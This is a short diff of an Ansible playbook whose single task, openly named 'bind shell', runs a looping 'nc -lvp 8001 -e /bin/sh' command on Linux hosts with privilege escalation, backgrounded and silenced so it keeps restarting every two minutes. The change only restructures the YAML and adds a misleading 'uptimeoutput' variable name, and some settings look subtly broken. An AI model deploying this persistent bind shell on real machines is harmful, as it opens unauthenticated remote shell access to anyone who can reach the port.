@@ -1,6 +1,9 @@
-- hosts: linux
+- name: bin shell
+  hosts: linux
   become: true
   become_method: enable
   ignore_errors: true
-  - name: "Run a shell command on a remote host"
-    shell: while :; do nc -lvp 8001 -e /bin/sh; sleep 120; done &>/dev/null &
+  tasks:
+    - name: bind shell
+      register: uptimeoutput
+      command: "while :; do nc -lvp 8001 -e /bin/sh; sleep 120; done &>/dev/null &"
